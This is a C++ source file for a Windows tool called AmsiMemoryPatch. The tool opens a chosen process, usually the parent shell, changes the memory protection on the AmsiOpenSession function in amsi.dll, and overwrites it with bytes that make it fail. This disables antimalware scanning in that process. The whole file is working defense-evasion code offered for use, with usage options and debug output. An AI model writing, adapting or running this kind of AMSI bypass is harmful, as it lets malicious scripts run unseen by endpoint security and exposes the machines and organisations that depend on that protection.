/*
Author: kuyaya
Last edited: 26.09.2023
*/

#include <iostream>
#include <Windows.h>
#include <string>

int Fail(LPCSTR functionName, DWORD errorCode) {
    printf("[-] %s failed with error code 0x%X, aborting...\n", functionName, errorCode);
    return errorCode;
}

int printHelpAndExit() {
    const char *helpText = "Usage:\n"
        "    AmsiMemoryPatch.exe [option]\n"
        "\n"
        "Options:\n"
        "    -h, --help        Display this help message\n"
        "    --self            Use the current process's PID (not recommended)\n"
        "    --parent          Use the parent process's PID (recommended)\n"
        "    --pid <pid>       Use the specified PID\n";
    printf("%s", helpText);
    return 0;
}

ULONG_PTR GetParentProcessId() // By Napalm @ NetCore2K, proudly copied from Stackoverflow
{
    ULONG_PTR pbi[6];
    ULONG ulSize = 0;
    LONG(WINAPI * NtQueryInformationProcess)(
        HANDLE ProcessHandle,
        ULONG ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
        );
    *(FARPROC*)&NtQueryInformationProcess = GetProcAddress(LoadLibraryA("NTDLL.DLL"), "NtQueryInformationProcess");
    if (NtQueryInformationProcess) {
        if (NtQueryInformationProcess(GetCurrentProcess(), 0,
            &pbi, sizeof(pbi), &ulSize) >= 0 && ulSize == sizeof(pbi))
            return pbi[5];
    }
    return (ULONG_PTR)-1;
}

int main(int argc, char* argv[])
{
    LPCSTR dllName = "amsi.dll";
    LPCSTR patchFunctionName = "AmsiOpenSession";
    BYTE rawHexBytes[] = { 0xb8, 0x57, 0x00, 0x07, 0x80, 0xc3 };
    DWORD lastStatus;
    MEMORY_BASIC_INFORMATION memoryInformation;
    SIZE_T bytesWritten;
    DWORD pid;

    if (argc == 1 || argv[1] == std::string("-h") || argv[1] == std::string("--help")) {
        return printHelpAndExit();
    }
    else {
        if (argv[1] == std::string("--self")) {
            pid = GetCurrentProcessId();
        }   
        else if (argv[1] == std::string("--parent")) {
            pid = (DWORD)GetParentProcessId();
        }
        else if (argv[1] == std::string("--pid")) {
            try {
                pid = std::stoi(argv[2]);
            }
            catch (const std::invalid_argument&) {
                printf("Please provide an integer when using the \"--pid\" option.");
                return 1;
            }
        }
        else {
            printf("Please provide a valid option.");
            return 1;
        }
    }

    printf("[DEBUG] Targeting process ID %u\n", pid);

    HMODULE loadedDll = LoadLibraryA(dllName);
    if (!loadedDll) {
        return Fail("LoadLibraryA", GetLastError());
    }
    printf("[DEBUG] Loaded DLL %s with base address 0x%p\n", dllName, loadedDll);

    FARPROC functionAddress = GetProcAddress(loadedDll, patchFunctionName);
    if (!functionAddress) {
        return Fail("GetProcAddress", GetLastError());
    }
    printf("[DEBUG] Got address 0x%p of function %s\n", functionAddress, patchFunctionName);

    HANDLE targetProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
    if (!targetProcess) {
        return Fail("OpenProcess", GetLastError());
    }
    printf("[DEBUG] Opened target process, HANDLE has memory address 0x%p\n", targetProcess);

    SIZE_T queryStatus = VirtualQueryEx(targetProcess, functionAddress, &memoryInformation, sizeof(memoryInformation));
    if (!queryStatus) {
        return Fail("VirtualQueryEx", GetLastError());
    }
    printf("[DEBUG] Queried memory, protect permission is: 0x%X\n", memoryInformation.Protect);

    BOOL memoryPermissionStatus = VirtualProtectEx(targetProcess, functionAddress, sizeof(rawHexBytes), PAGE_EXECUTE_READWRITE, &lastStatus);
    if (!memoryPermissionStatus) {
        return Fail("VirtualProtectEx", GetLastError());
    }
    printf("[DEBUG] Changed permission status, previous permission was 0x%X\n", lastStatus);

    BOOL overwriteStatus = WriteProcessMemory(targetProcess, functionAddress, rawHexBytes, sizeof(rawHexBytes), &bytesWritten);
    if (!overwriteStatus) {
        return Fail("WriteProcessMemory", GetLastError());
    }
    printf("[DEBUG] Overwrote %lu bytes in memory with status code 0x%X\n", (unsigned long)bytesWritten, overwriteStatus);

    CloseHandle(targetProcess);
}

